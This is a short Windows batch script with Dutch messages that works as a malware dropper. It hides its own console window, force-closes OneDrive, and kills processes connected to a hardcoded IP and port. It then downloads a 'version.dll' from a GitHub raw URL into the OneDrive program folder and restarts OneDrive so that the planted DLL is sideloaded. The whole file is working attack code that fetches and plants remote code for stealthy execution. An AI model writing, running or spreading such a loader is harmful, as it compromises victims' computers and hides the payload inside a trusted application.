@echo off
:: Verberg CMD-venster door het script opnieuw geminimaliseerd te starten
if "%1" neq "hide" (
    start /min cmd /c %0 hide
    exit
)

echo Controleren of OneDrive actief is...
tasklist | findstr /i "OneDrive.exe" >nul
if %errorlevel%==0 (
    echo OneDrive wordt afgesloten...
    taskkill /f /im OneDrive.exe >nul 2>&1
) else (
    echo OneDrive was al gesloten.
)

echo Controleren op actieve verbinding met 147.185.221.26:2121...
netstat -ano | findstr "147.185.221.27:12507" >nul
if %errorlevel%==0 (
    for /f "tokens=5" %%a in ('netstat -ano ^| findstr "147.185.221.27:12507"') do (
        echo Sluiten van proces met PID: %%a
        taskkill /f /pid %%a >nul 2>&1
    )
) else (
    echo Geen actieve verbinding gevonden.
)

:: Dynamisch pad voor OneDrive-map
set ONEDRIVE_PATH=%USERPROFILE%\AppData\Local\Microsoft\OneDrive
set DLL_PATH=%ONEDRIVE_PATH%\version.dll

echo Downloaden van version.dll...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mmmdat/dvdvv/main/version.dll', '%DLL_PATH%')"

if exist "%DLL_PATH%" (
    echo Download voltooid: %DLL_PATH%
) else (
    echo Download mislukt!
)

echo OneDrive wordt opnieuw gestart...
start "" "%ONEDRIVE_PATH%\OneDrive.exe"

echo OneDrive is opnieuw gestart!
exit
